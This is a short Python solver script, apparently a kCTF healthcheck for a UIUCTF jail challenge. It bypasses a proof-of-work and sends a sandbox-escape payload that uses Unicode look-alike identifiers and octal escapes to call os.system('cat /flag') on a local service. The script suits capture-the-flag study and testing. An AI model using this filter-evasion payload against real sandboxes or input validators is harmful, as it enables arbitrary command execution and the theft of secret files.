#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib

def handle_pow(r):
    print(r.recvuntil(b'python3 '))
    print(r.recvuntil(b' solve '))
    challenge = r.recvline().decode('ascii').strip()
    p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
    solution = p.readall().strip()
    r.sendline(solution)
    print(r.recvuntil(b'Correct\n'))

r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
print(r.recvuntil('== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
    handle_pow(r)

payload = r'__𝖎𝖒𝖕𝖔𝖗𝖙__("\157\163").𝖘𝖞𝖘𝖙𝖊𝖒("\143\141\164\040\057\146\154\141\147")'
#payload = b'__\xf0\x9d\x96\x8e\xf0\x9d\x96\x92\xf0\x9d\x96\x95\xf0\x9d\x96\x94\xf0\x9d\x96\x97\xf0\x9d\x96\x99__("os").\xf0\x9d\x96\x98\xf0\x9d\x96\x9e\xf0\x9d\x96\x98\xf0\x9d\x96\x99\xf0\x9d\x96\x8a\xf0\x9d\x96\x92("cat /flag")'
r.sendline(payload)
flag = r.recvuntilb(b'}')

if b"uiuctf{" in flag:
    exit(0)
exit(1)
